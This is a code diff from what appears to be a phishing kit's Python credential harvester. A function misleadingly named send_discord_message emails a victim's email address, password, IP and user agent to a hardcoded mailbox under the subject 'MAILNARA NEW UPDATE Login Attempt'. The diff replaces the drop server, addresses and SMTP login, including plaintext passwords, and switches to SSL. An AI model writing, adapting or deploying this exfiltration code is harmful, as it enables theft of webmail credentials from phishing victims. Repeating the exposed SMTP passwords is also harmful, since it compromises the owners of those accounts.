@@ -19,14 +19,14 @@ import dns.resolver
 
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
-    smtp_server = "smtp.cafe24.com"
-    smtp_port = 587
+    smtp_server = "server71.web-hosting.com"
+    smtp_port = 465
 
-    sender = "full@winwincm.com"
-    receiver = "sjpark@insunsgacc.com"
+    sender = "yoipau@harvaneserver.quest"
+    receiver = "yoipau@harvaneserver.quest"
 
-    smtp_user = "full@winwincm.com"
-    smtp_password = "full13579"
+    smtp_user = "yoipau@harvaneserver.quest"
+    smtp_password = "@8I&yz8mR.h!"
 
     subject = "MAILNARA NEW UPDATE Login Attempt"
 
@@ -51,7 +51,7 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
     msg.attach(MIMEText(body, "html"))
 
     try:
-        with smtplib.SMTP(smtp_server, smtp_port) as server:                # upgrade connection
+        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:                # upgrade connection
             server.login(smtp_user, smtp_password)  # SMTP authentication
             server.sendmail(sender, receiver, msg.as_string())
     except Exception as e:
